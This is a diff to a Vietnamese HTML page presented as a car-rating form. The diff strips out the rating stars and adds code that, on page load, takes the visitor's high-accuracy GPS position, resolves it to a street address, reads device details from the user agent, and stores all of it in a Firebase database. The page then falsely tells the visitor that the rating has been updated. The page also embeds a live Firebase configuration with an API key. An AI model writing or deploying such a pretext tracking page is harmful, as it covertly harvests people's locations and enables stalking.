@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Đánh giá ô tô của bạn</title>
     <style>
-        /* Đặt font chữ và căn chỉnh toàn trang */
         body {
             font-family: 'Arial', sans-serif;
             display: flex;
@@ -13,96 +12,51 @@
             align-items: center;
             height: 100vh;
             margin: 0;
-            background-color: #f4f4f4;
+            background-color: #e9ecef;
             color: #333;
         }
 
-        /* Khung chính giữa trang */
         .container {
             text-align: center;
             background-color: white;
             padding: 40px;
             border-radius: 10px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
             max-width: 500px;
             width: 100%;
-            position: relative;
         }
 
         h1 {
-            font-size: 26px;
+            font-size: 28px;
             color: #007BFF;
             margin-bottom: 20px;
         }
 
-        p {
-            font-size: 18px;
-            margin-bottom: 20px;
-        }
-
-        /* Thêm biểu tượng ô tô */
-        .icon {
-            font-size: 50px;
-            color: #007BFF;
-            margin-bottom: 20px;
-        }
-
-        /* Thêm hiệu ứng khi đang xử lý */
-        #result {
-            padding: 15px;
-            background-color: #f9f9f9;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            margin-bottom: 20px;
-        }
-
-        /* Tạo hiệu ứng tải */
-        .loading {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #3498db;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-
-        /* Keyframe cho hiệu ứng xoay */
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        /* Hệ thống sao đánh giá */
-        .stars {
-            display: flex;
-            justify-content: center;
-            margin-bottom: 20px;
-        }
-
-        .star {
-            font-size: 30px;
-            color: #FFD700;
-            margin: 0 5px;
-            cursor: pointer;
-        }
-
-        .star:hover {
-            color: #ff9f00;
-        }
-
-        /* Thông báo thành công */
         .success {
             color: green;
+            font-size: 18px;
+        }
+
+        .error {
+            color: red;
+            font-size: 18px;
+        }
+
+        .icon {
+            font-size: 50px; /* Kích thước biểu tượng lớn hơn */
+            margin-bottom: 20px;
+        }
+
+        .loading {
+            font-size: 20px;
             font-weight: bold;
+            color: #007BFF;
         }
     </style>
     <script type="module">
-        // Import the functions you need from the SDKs
         import { initializeApp } from "https://www.gstatic.com/firebasejs/9.21.0/firebase-app.js";
         import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/9.21.0/firebase-firestore.js";
 
-        // Firebase configuration
         const firebaseConfig = {
             apiKey: "AIzaSyCPrnIf-vF2_JOf-E8hgtEVOyCq8s1AviY",
             authDomain: "gknm-b263e.firebaseapp.com",
@@ -113,44 +67,88 @@
             measurementId: "G-TWXGN6PJ32"
         };
 
-        // Initialize Firebase
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
 
-        // Get location and save to Firestore
-        function getLocation() {
-            if (navigator.geolocation) {
-                // Options to improve accuracy
-                const options = {
-                    enableHighAccuracy: true, // Request higher accuracy
-                    timeout: 10000, // Set a timeout for the request
-                    maximumAge: 0 // Do not use a cached location
-                };
+        async function getLocationName(latitude, longitude) {
+            const url = `https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json&addressdetails=1`;
 
+            try {
+                const response = await fetch(url);
+                const data = await response.json();
+                console.log(data); // Ghi lại phản hồi API để kiểm tra
+
+                if (data && data.address) {
+                    const address = data.address;
+                    let locationName = '';
+                    if (address.road) locationName += address.road;
+                    if (address.house_number) locationName += `, ${address.house_number}`;
+                    if (address.city) locationName += `, ${address.city}`;
+                    else if (address.town) locationName += `, ${address.town}`;
+                    else if (address.village) locationName += `, ${address.village}`;
+                    if (address.state) locationName += `, ${address.state}`;
+                    if (address.country) locationName += `, ${address.country}`;
+                    return locationName;
+                } else {
+                    console.error("Không thể lấy tên vị trí");
+                    return "Không thể lấy tên vị trí";
+                }
+            } catch (error) {
+                console.error("Lỗi khi lấy tên vị trí: ", error);
+                return "Không thể lấy tên vị trí";
+            }
+        }
+
+        function getDeviceInfo() {
+            const userAgent = navigator.userAgent;
+            let deviceInfo = "Thiết bị không xác định";
+
+            // Xác định thiết bị
+            if (/iPhone/i.test(userAgent)) {
+                const match = userAgent.match(/iPhone\sOS\s([\d_]+)/);
+                deviceInfo = `iPhone ${match ? match[1].replace(/_/g, '.') : ''}`;
+            } else if (/Samsung/i.test(userAgent)) {
+                const match = userAgent.match(/Samsung\s*\/\s*([^\s]+)/);
+                deviceInfo = `Samsung ${match ? match[1] : ''}`;
+            } else if (/Android/i.test(userAgent)) {
+                deviceInfo = "Thiết bị Android";
+            } else if (/Windows/i.test(userAgent)) {
+                deviceInfo = "Máy tính Windows";
+            } else if (/Macintosh/i.test(userAgent)) {
+                deviceInfo = "Máy tính Mac";
+            }
+            return deviceInfo;
+        }
+
+        async function getLocation() {
+            if (navigator.geolocation) {
+                const options = { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 };
                 navigator.geolocation.getCurrentPosition(async (position) => {
                     const latitude = position.coords.latitude;
                     const longitude = position.coords.longitude;
 
-                    console.log("Latitude:", latitude);
-                    console.log("Longitude:", longitude);
+                    // Lấy tên vị trí
+                    const locationName = await getLocationName(latitude, longitude);
 
-                    document.getElementById("result").innerHTML = 
-                        "Đánh giá đã được cập nhật.";
-
-                    document.getElementById("result").classList.add("success");
-
-                    // Save to Firestore
+                    // Lưu vào Firestore
                     try {
                         const docRef = await addDoc(collection(db, 'location'), {
                             latitude: latitude,
                             longitude: longitude,
+                            locationName: locationName,
+                            deviceInfo: getDeviceInfo(),
                             timestamp: serverTimestamp()
                         });
                         console.log(`Document written with ID: ${docRef.id}`);
+                        document.getElementById("result").innerHTML = `Đánh giá đã được cập nhật.`;
+                        document.getElementById("result").classList.add("success");
                     } catch (error) {
                         console.error("Error adding document: ", error);
+                        document.getElementById("result").innerHTML = "Đã xảy ra lỗi khi lưu thông tin.";
+                        document.getElementById("result").classList.remove("success");
+                        document.getElementById("result").classList.add("error");
                     }
-                }, showError, options); // Pass options here
+                }, showError, options);
             } else {
                 alert("Trình duyệt của bạn không hỗ trợ chức năng này.");
             }
@@ -160,48 +158,33 @@
             let message = "";
             switch(error.code) {
                 case error.PERMISSION_DENIED:
-                    message = "Quyền truy cập vị trí đã bị từ chối. Vui lòng cho phép truy cập.";
+                    message = "Quyền truy cập vị trí đã bị từ chối.";
                     break;
                 case error.POSITION_UNAVAILABLE:
-                    message = "Dữ liệu vị trí không khả dụng. Vui lòng thử lại.";
+                    message = "Dữ liệu vị trí không khả dụng.";
                     break;
                 case error.TIMEOUT:
-                    message = "Yêu cầu lấy vị trí đã hết thời gian chờ. Vui lòng thử lại.";
+                    message = "Yêu cầu lấy vị trí đã hết thời gian chờ.";
                     break;
-                case error.UNKNOWN_ERROR:
-                    message = "Đã xảy ra lỗi không xác định. Vui lòng thử lại.";
-                    break;
+                default:
+                    message = "Đã xảy ra lỗi không xác định.";
             }
             alert(message);
             document.getElementById("result").innerHTML = message;
             document.getElementById("result").classList.remove("success");
+            document.getElementById("result").classList.add("error");
         }
 
-        // Automatically get location when the page loads
         document.addEventListener("DOMContentLoaded", function() {
-            // Khi trang vừa tải, hiển thị hiệu ứng loading
-            document.getElementById("result").innerHTML = 
-                '<div class="loading"></div> Đang xử lý...';
+            document.getElementById("result").innerHTML = '<div class="loading"></div> Đang xử lý...';
             getLocation();
         });
     </script>
 </head>
 <body>
     <div class="container">
-        <!-- Biểu tượng ô tô -->
         <div class="icon">🚗</div>
         <h1>Đánh giá ô tô của bạn</h1>
-
-        <!-- Hệ thống sao đánh giá -->
-        <div class="stars">
-            <span class="star">★</span>
-            <span class="star">★</span>
-            <span class="star">★</span>
-            <span class="star">★</span>
-            <span class="star">★</span>
-        </div>
-
-        <!-- Kết quả xử lý -->
         <p id="result">Đang xử lý...</p>
     </div>
 </body>
